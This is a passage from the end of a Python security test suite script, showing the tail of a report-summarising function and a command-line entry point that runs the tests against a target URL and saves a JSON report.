        logger.info(f"Results: {passed_tests}/{total_tests} tests passed")
        
        if failed_tests > 0:
            logger.warning(f"🚨 Found {failed_tests} security issues:")
            for severity in ["critical", "high", "medium", "low"]:
                count = severity_counts.get(severity, 0)
                if count > 0:
                    logger.warning(f"  {severity.upper()}: {count}")
        
        return report


# ============================================================================
# Test Runner
# ============================================================================

def main():
    """Main function to run security tests."""
    import argparse
    
    parser = argparse.ArgumentParser(description="Security Test Suite")
    parser.add_argument("--target", required=True, help="Target URL to test")
    parser.add_argument("--output", help="Output file for results (JSON)")
    parser.add_argument("--verbose", "-v", action="store_true", help="Verbose output")
    
    args = parser.parse_args()
    
    if args.verbose:
        logging.basicConfig(level=logging.INFO)
    
    # Initialize and run tests
    config = SecurityTestConfig(args.target)
    tester = SecurityTester(config)
    
    report = tester.run_all_tests()
    
    # Save results
    if args.output:
        with open(args.output, 'w') as f:
            json.dump(report, f, indent=2, default=str)
        print(f"Results saved to {args.output}")
    else:
        print(json.dumps(report, indent=2, default=str))


if __name__ == "__main__":
    main()